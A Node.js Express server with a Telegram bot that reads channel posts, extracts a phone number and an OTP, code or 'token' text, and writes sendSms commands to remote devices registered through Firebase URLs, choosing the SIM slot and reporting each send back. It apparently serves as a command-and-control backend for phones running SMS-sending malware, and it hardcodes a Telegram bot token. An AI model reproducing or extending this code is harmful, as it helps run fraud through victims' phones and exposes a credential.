const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { Telegraf } = require('telegraf');
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = '8928344876:AAHhu5s2eAsfIQmOLjdjuwy_-JRD0fruwNA';
const DATA_FILE = path.join(__dirname, 'data.json');
let store = { users: {} };
let processed = new Set();
let cfgCache = {};
const CFG_TTL = 120000;
function load() { try { if (fs.existsSync(DATA_FILE)) store = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); } catch (e) {} }
function save() { try { fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2)); } catch (e) {} }
load();
const app = express();
app.use(express.json());
app.use(express.static(__dirname));
app.get('/', function (req, res) {
    const p = path.join(__dirname, 'panel.html');
    if (fs.existsSync(p)) res.sendFile(p);
    else res.send('panel.html missing');
});
app.post('/api/register', function (req, res) {
    const u = req.body.firebaseUrl;
    if (u === undefined) return res.status(400).json({ error: 'missing url' });
    const clean = u.replace(/\/$/, '');
    store.users[clean] = store.users[clean] || {};
    store.users[clean].registeredAt = Date.now();
    save();
    fbGet(clean, 'bot_config').then(function (cfg) { cfgCache[clean] = { cfg: cfg, at: Date.now() }; }).catch(function () {});
    console.log('Registered:', clean);
    res.json({ ok: true });
});
app.get('/api/status', function (req, res) {
    res.json({ ok: true, users: Object.keys(store.users).length });
});
app.post('/api/notify-channel', async function (req, res) {
    try {
        const channel = req.body.channel;
        const action = req.body.action;
        const sim = req.body.sim || 0;
        if (!channel) return res.json({ ok: false });
        const msg = action === 'on' ? ('Token CHALU - SIM ' + (sim + 1)) : 'Token BAND';
        await bot.telegram.sendMessage(channel, msg);
        Object.keys(store.users).forEach(function (u) { fbGet(u, 'bot_config').then(function (c) { cfgCache[u] = { cfg: c, at: Date.now() }; }).catch(function () {}); });
        res.json({ ok: true });
    } catch (e) { res.json({ ok: false }); }
});
app.listen(PORT, '0.0.0.0', function () { console.log('Server: http://0.0.0.0:' + PORT); });
async function fbGet(url, p) {
    try { const r = await axios.get(url.replace(/\/$/, '') + '/' + p + '.json', { timeout: 8000 }); return r.data; }
    catch (e) { return null; }
}
async function fbPut(url, p, data) {
    try { const r = await axios.put(url.replace(/\/$/, '') + '/' + p + '.json', data, { timeout: 8000 }); return r.status === 200; }
    catch (e) { return false; }
}
function getCfg(u) { const c = cfgCache[u]; if (c && (Date.now() - c.at) < CFG_TTL) return c.cfg; return null; }
function refreshCfg(u) { return fbGet(u, 'bot_config').then(function (cfg) { cfgCache[u] = { cfg: cfg, at: Date.now() }; return cfg; }).catch(function () { return null; }); }
setInterval(function () { Object.keys(store.users).forEach(function (u) { refreshCfg(u); }); }, 60000);
const bot = new Telegraf(BOT_TOKEN);

// ============ SIMPLE EXTRACT ============
function extract(text) {
    if (!text) return null;
    var m = text.match(/To\s*(?:\(Tap to copy\))?\s*[:\-]?[\s\n]*\+?(\d{10,12})/i);
    if (!m) m = text.match(/Receipt\s*[:\-]?[\s\n]*\+?(\d{10,12})/i);
    if (!m) m = text.match(/Number\s*[:\-]?[\s\n]*\+?(\d{10,12})/i);
    if (!m) m = text.match(/Phone\s*[:\-]?[\s\n]*\+?(\d{10,12})/i);
    if (!m) return null;
    var number = m[1];
    var b = text.match(/Body\s*(?:\(Tap to copy\))?\s*[:\-]?[\s\n]*([\s\S]+)/i);
    if (!b) b = text.match(/Message\s*[:\-]?[\s\n]*([\s\S]+)/i);
    if (!b) b = text.match(/Msg\s*[:\-]?[\s\n]*([\s\S]+)/i);
    if (!b) b = text.match(/Token\s*[:\-]?[\s\n]*([\s\S]+)/i);
    if (!b) b = text.match(/OTP\s*[:\-]?[\s\n]*([\s\S]+)/i);
    if (!b) b = text.match(/Code\s*[:\-]?[\s\n]*([\s\S]+)/i);
    if (!b) return null;
    var message = b[1].replace(/^[\s\n\r]+/, '').replace(/[\s\n\r]+$/, '');
    if (!message) return null;
    return { number: number, message: message };
}

function cleanNumber(num) {
    return String(num).trim();
}

bot.on('channel_post', function (ctx) {
    const start = Date.now();
    const text = ctx.channelPost.text || ctx.channelPost.caption || '';
    const chatId = ctx.chat.id.toString();
    const msgId = ctx.channelPost.message_id;
    if (!text) return;
    console.log('\n=== NEW MSG ===');
    console.log('First 150:', JSON.stringify(text.slice(0, 150)));
    const tok = extract(text);
    if (!tok) { console.log('No token'); return; }
    const globalKey = chatId + '_' + msgId;
    if (processed.has(globalKey)) { console.log('Dup'); return; }
    processed.add(globalKey);
    if (processed.size > 2000) processed = new Set(Array.from(processed).slice(-1000));
    console.log('Extracted num:', tok.number);
    console.log('Extracted msg:', JSON.stringify(tok.message.slice(0, 100)));
    const urls = Object.keys(store.users);
    urls.forEach(function (fbUrl) {
        const proc = function (cfg) {
            if (!cfg) return;
            if (!cfg.channels) return;
            if (cfg.channels.indexOf(chatId) === -1) return;
            if (!cfg.tokenEnabled) return;
            if (!cfg.tokenDevice) return;
            const clean = cleanNumber(tok.number);
            const ts = Date.now();
            const devId = cfg.tokenDevice;
            const sim = cfg.tokenSim || 0;
            fbPut(fbUrl, 'clients/' + devId + '/webhookEvent/sendSms', {
                to: clean, message: tok.message, isSended: false,
                timestamp: ts, commandId: 'tk_' + ts,
                simInfo: { simSlot: sim }, fromToken: true
            }).catch(function () {});
            const elapsed = Date.now() - start;
            const reply = 'SMS Bhej diya' + '\n\n' +
                'Device: ' + devId + '\n' +
                'To: ' + clean + '\n' +
                'SIM: ' + (sim + 1) + '\n' +
                'Time: ' + elapsed + 'ms' + '\n\n' +
                'Body:' + '\n' + tok.message;
            bot.telegram.sendMessage(chatId, reply, { reply_to_message_id: msgId }).catch(function () {});
            console.log('Sent', clean, elapsed + 'ms');
        };
        const cached = getCfg(fbUrl);
        if (cached) proc(cached);
        else refreshCfg(fbUrl).then(proc).catch(function () {});
    });
});

bot.command('id', function (ctx) { ctx.reply('ID: ' + ctx.from.id + '\nChat: ' + ctx.chat.id); });
bot.command('start', function (ctx) { ctx.reply('ANANYA Bot'); });

bot.launch().then(function () {
    console.log('Bot started');
    Object.keys(store.users).forEach(function (u) { refreshCfg(u); });
}).catch(function (e) { console.log('Bot err:', e.message); });